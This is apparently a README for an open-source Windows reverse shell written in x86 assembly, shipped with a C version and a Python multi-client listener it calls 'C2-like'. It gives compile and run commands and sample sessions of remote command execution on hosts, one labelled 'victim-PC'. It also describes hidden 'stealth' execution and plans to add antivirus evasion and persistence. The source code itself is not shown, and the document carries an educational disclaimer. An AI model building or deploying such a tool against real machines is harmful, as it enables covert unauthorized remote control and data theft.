
# **x86-Assembly-ReverseShell** 📡  
A **pure x86 Assembly** reverse shell for Windows that connects to a remote listener for command execution. Uses **Winsock**, **Windows Job Objects** for process management, and redirects **stdin, stdout, stderr** to the socket for full interactive control. Includes a **C equivalent** and a **Python listener** for testing.

---

## **Features**
- Pure Assembly – No dependencies, fully written in x86 Assembly.  
- Reverse Shell – Connects back to a remote listener.  
- Interactive Shell – Redirects input, output, and error streams to the socket.  
- Job Object Protection – Ensures `cmd.exe` is terminated if the connection drops.  
- Minimal Footprint – Small, fast, and runs without extra libraries.  
- C Equivalent – 1:1 C code provided for reference.  
- Python Listener – Basic C2-like listener included for testing.  
- Batch Compilation – Pre-made `.bat` file for quick assembly and linking.  

---

## **Project Structure**
```
/x86-Assembly-ReverseShell
│── reverse_shell.asm  # Main Assembly reverse shell
│── reverse_shell.c    # 1:1 C equivalent source code
│── requirements.txt   # Listener dependencies
│── compile.bat        # Windows batch script to compile & link automatically
│── listener.py        # Python-based listener (C2-like functionality)
│── listener_linux.py  # Python-based listener for linux
│── README.md          # Project documentation
```

---

## **How It Works**
1. Creates a TCP connection to `127.0.0.1:4444` (**hardcoded in Assembly**).
   - To change the IP/Port, manually modify the `sockaddr_in` structure in `reverse_shell.asm`.
2. Redirects stdin, stdout, stderr of `cmd.exe` to the socket.  
3. Runs `cmd.exe` in hidden mode for stealth execution.  
4. Uses a Windows Job Object (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) to ensure process cleanup.  
5. Communicates with the listener (`listener.py`) for remote command execution.  

---

## **Setup & Installation**
### **1. Install Python (if not already installed)**
Ensure Python 3.x is installed.  
To check, run:
```bash
python3 --version
```
or on Windows:
```cmd
python --version
```

### **2. Install Dependencies**
`listener.py` requires `colorama` for colored output and `pyreadline3` (Windows only).  
To install dependencies, run:
```bash
pip install -r requirements.txt
```
If you're on **Windows**, also install:
```bash
pip install pyreadline3
```

---

## **Using `listener.py`**
### **1. Start the Listener**
```bash
python3 listener.py
```
By default, it listens on `0.0.0.0:4444`, allowing connections from **any IP**.  
You can **customize the listener IP & port**:
```bash
python3 listener.py --ip 192.168.1.100 --port 8080
```

### **2. Wait for Incoming Connections**
Once a reverse shell connects, you'll see:
```bash
[2025-02-23 16:30:20] New connection from 192.168.1.10:50234
```

### **3. Interact with the Reverse Shell**
Simply type commands:
```bash
Shell> whoami
admin-PC\admin
Shell> dir
 Volume in drive C has no label.
 Directory of C:\Users\admin
```

### **4. List Connected Clients**
Use `clients` to see active sessions:
```bash
SHELL> clients
--------------------------------------------------
  [0] 192.168.1.10:50234 - ACTIVE
  [1] 192.168.1.12:50240 - IDLE
--------------------------------------------------
```

### **5. Switch Between Clients**
Select a client by ID:
```bash
SHELL> switch 1
[2025-02-23 16:31:10] Switched to client 192.168.1.12:50240
Client 1> whoami
victim-PC\user
```

### **6. Built-in Commands**
| **Command** | **Description** |
|------------|----------------|
| `clients`  | Show connected clients |
| `switch <id>` | Switch to a specific client |
| `sessions` | List saved sessions |
| `id`       | Show the current client ID |
| `info`     | Show current client system info |
| `clear`    | Clear the terminal |
| `help`     | Show this help menu |
| `exit`     | Close the current session |

---


## **Compilation & Execution**
### **📌 Method 1: Using `compile.bat` (Recommended)**
A **Windows batch script** (`compile.bat`) is included for **automatic assembly and linking**.  

> **⚠️ Important:**  
> The script **requires the Microsoft Developer Command Prompt** because it uses `link.exe`.  
> If you don’t have it, you need to **install Visual Studio with the MSVC toolchain**.  

#### **🔷 Option 1: Manually Open Developer Command Prompt**
1. Open **Start Menu** and search for:
   - **Developer Command Prompt for VS** (preferred)
   - Or **x64 Native Tools Command Prompt**
2. **Navigate to the project folder**:
   ```cmd
   cd C:\path\to\x86-Assembly-ReverseShell
   ```
3. **Run the compiler script**:
   ```cmd
   compile.bat
   ```
---
### **📌 Method 2: Manual Compilation**
#### **Using `nasm` and `link.exe`**
```cmd
nasm -f win32 reverse_shell.asm -o reverse_shell.obj
link /entry:Start /subsystem:console reverse_shell.obj kernel32.lib ws2_32.lib
```
> **🔴 If `link` is not found**, use the **Developer Command Prompt** as explained above.

#### **Using `nasm` and `mingw-w64` (`ld`)**
```cmd
nasm -f win32 reverse_shell.asm -o reverse_shell.o
ld -o reverse_shell.exe reverse_shell.o -lkernel32 -lws2_32
```
> **🟢 This method works without `link.exe`**, using `mingw-w64` instead.

---
### **Running the Reverse Shell**
After compiling, execute:
```cmd
reverse_shell.exe
```
Ensure the listener (`listener.py`) is **running before executing the shell**.

---

## **Security & Legal Notice**
> **⚠️ Disclaimer:**  
> This project is for **educational and research purposes only**.  
> Unauthorized use on **live systems** is illegal. Always test in **controlled environments (VMs, labs, or CTFs)**.  

---

## **Future Enhancements**
- Encrypt communication (e.g., XOR, AES).  
- Obfuscate Assembly code to evade signature-based detection.  
- Implement persistence mechanisms for maintaining access.  
- Add support for additional platforms (Linux/macOS).  

---

## **References**
- [Windows API Documentation](https://docs.microsoft.com/en-us/windows/win32/api/)
- [Winsock Programming](https://docs.microsoft.com/en-us/windows/win32/winsock/)
- [NASM Assembly Guide](https://www.nasm.us/)

---

DM `ceptronn` on Discord for any questions!
